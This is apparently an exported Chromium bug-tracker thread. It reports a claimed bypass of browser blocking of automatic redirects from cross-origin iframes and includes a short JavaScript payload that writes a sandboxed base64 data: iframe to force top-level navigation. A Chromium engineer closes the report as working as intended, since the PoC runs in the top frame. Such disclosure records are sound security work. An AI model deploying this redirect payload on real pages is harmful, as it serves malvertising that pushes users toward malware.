@@ -1,0 +1,79 @@
+Issue ID: 430201820
+
+Author: ch...@google.com
+<h1>Steps to reproduce the problem</h1>
+<p>Steps to reproduce the problem:
+Hi Team,</p>
+<p>Current versions of desktop and mobile web browsers including Chrome, Safari, Edge, Opera, and Brave will block automatic redirects that are not activated by user interaction from cross-origin iframes.</p>
+<p>Consider the following payload that will always get blocked when served in a cross-origin iframe:</p>
+<div>&lt;script&gt;
+    top.window.location = &quot;https://google.com&quot;;
+&lt;/script&gt;
+</div>
+<p>open the attach file
+its open google.com without user interaction</p>
+<div>&lt;script type=&quot;text/javascript&quot;&gt;
+  var x = &#39;&lt;html&gt;&lt;body&gt;&lt;script type=&quot;text/javascript&quot;&gt; window.top.location = &quot;https://google.com&quot;;&#39; + &#39;&lt;/scr&#39; + &#39;ipt&gt;&lt;/body&gt;&lt;/html&gt;&#39;;
+  var bs64 = btoa(x);
+  document.write(&#39;&lt;iframe sandbox=&quot;allow-top-navigation allow-scripts&quot; src=&quot;data:text/html;base64,&#39; + bs64 + &#39;&quot;&gt;&lt;/iframe&gt;&#39;)
+&lt;/script&gt;
+</div>
+<p>We have observed through testing that the sandbox parameters in the injected frame are key in in the bypass here.</p>
+<h1>Problem Description</h1>
+<p>Consider the following payload that will always get blocked when served in a cross-origin iframe:</p>
+<div>&lt;script&gt;
+    top.window.location = &quot;https://google.com&quot;;
+&lt;/script&gt;
+</div>
+<p>There exists a bug that bypasses this built-in mitigation and it&#39;s currently being leveraged as part of a malvertising chain to bypass the browser&#39;s redirect protection in order to drive traffic to malware.</p>
+<p>The following payload is being used:</p>
+<div>&lt;script type=&quot;text/javascript&quot;&gt;
+  var x = &#39;&lt;html&gt;&lt;body&gt;&lt;script type=&quot;text/javascript&quot;&gt; window.top.location = &quot;https://google.com&quot;;&#39; + &#39;&lt;/scr&#39; + &#39;ipt&gt;&lt;/body&gt;&lt;/html&gt;&#39;;
+  var bs64 = btoa(x);
+  document.write(&#39;&lt;iframe sandbox=&quot;allow-top-navigation allow-scripts&quot; src=&quot;data:text/html;base64,&#39; + bs64 + &#39;&quot;&gt;&lt;/iframe&gt;&#39;)
+&lt;/script&gt;
+</div>
+<h1>Summary</h1>
+<p>bypass blocked auto redirects from cross-origin iframes</p>
+<h1>Additional Data</h1>
+<p>Category: Security <br>
+Chrome Channel: Stable <br>
+Regression: Yes \</p>
+
+Author: ch...@google.com
+google_domain
+
+Author: bh...@gmail.com
+type.googleapis.com/google.devtools.issuetracker.v1.CustomFieldValue
+
+Author: bh...@gmail.com
+type.googleapis.com/google.devtools.issuetracker.v1.User
+
+Author: bh...@gmail.com
+public_non_google
+
+Author: se...@chromium.org
+type.googleapis.com/google.devtools.issuetracker.v1.User
+
+Author: se...@chromium.org
+public_non_google
+
+Author: ch...@google.com
+type.googleapis.com/google.protobuf.Int64Value
+
+Author: li...@chromium.org
+<p>Hello,</p>
+<p>As explained in <a href="https://crbug.com/430260684" target="_blank">crbug.com/430260684</a>#comment4, your prior PoC, as well as this one, are the top-level frame, which means that it is still working as intended.</p>
+<p>Please do not blindly copy-paste PoCs from prior fixed bugs when there is no indication that the previous fix does not work, and please do not resubmit reports of yours that were closed after it was explained why your submission was not a vulnerability.</p>
+
+Author: li...@chromium.org
+public_non_google
+
+Author: li...@chromium.org
+type.googleapis.com/google.protobuf.Int32Value
+
+Author: ch...@google.com
+<p>This bug has been closed for more than 14 weeks. Removing issue access restrictions.</p>
+
+Author: ch...@google.com
+type.googleapis.com/google.devtools.issuetracker.v1.IssueAccessLimit
